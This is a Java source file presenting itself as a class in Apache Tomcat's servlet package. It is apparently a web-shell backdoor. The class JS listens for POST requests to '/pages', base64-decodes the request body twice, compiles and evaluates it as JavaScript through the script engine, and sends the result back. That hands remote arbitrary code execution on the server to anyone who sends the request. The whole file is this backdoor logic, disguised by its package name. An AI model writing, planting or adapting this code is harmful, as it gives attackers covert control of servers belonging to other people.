package org.apache.catalina.servlets.sl;

import org.apache.catalina.servlets.redefine.MyRequest;
import org.apache.catalina.servlets.redefine.MyResponse;
import org.apache.catalina.servlets.redefine.MyServletOutputStream;

public class JS {
    private static final String pathPattern= "/pages";
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }
    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                java.util.Map objMap = (java.util.Map)obj;
                Object request = objMap.get("request");
                Object response = objMap.get("response");
                try {
                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                    byte[] cc = r(in);

                    String c = new String(cc);
                    try {
                        c = java.net.URLDecoder.decode(c, "UTF-8");
                    } catch (Exception ignored) {}
                    if (c.startsWith("a=")){
                        c = c.substring(2);
                    }
                    cc = c.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                    try {
                        Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                        Object Decoder = Base64.newInstance();
                        cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(new String(cc))});
                        cc=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                    } catch (Throwable ex)
                    {
                        Class Base64 = loader.loadClass("java.util.Base64");
                        Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                        cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                        cc=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{new String(cc)});
                    }

                    javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("js");
                    javax.script.Compilable compEngine=(javax.script.Compilable)engine;
                    javax.script.CompiledScript script=compEngine.compile(new String(cc));
                    String result=(String) script.eval();
                    java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                    MyServletOutputStream.write(so, result.getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, result.length());
                    MyServletOutputStream.flush(so);
                    MyServletOutputStream.close(so);
                } catch (Exception e) {
                    try {
                        java.io.OutputStream so = (java.io.OutputStream) MyResponse.getOutputStream(response);
                        MyServletOutputStream.write(so, e.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), 0, e.toString().length());
                        MyServletOutputStream.flush(so);
                        MyServletOutputStream.close(so);
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }
}
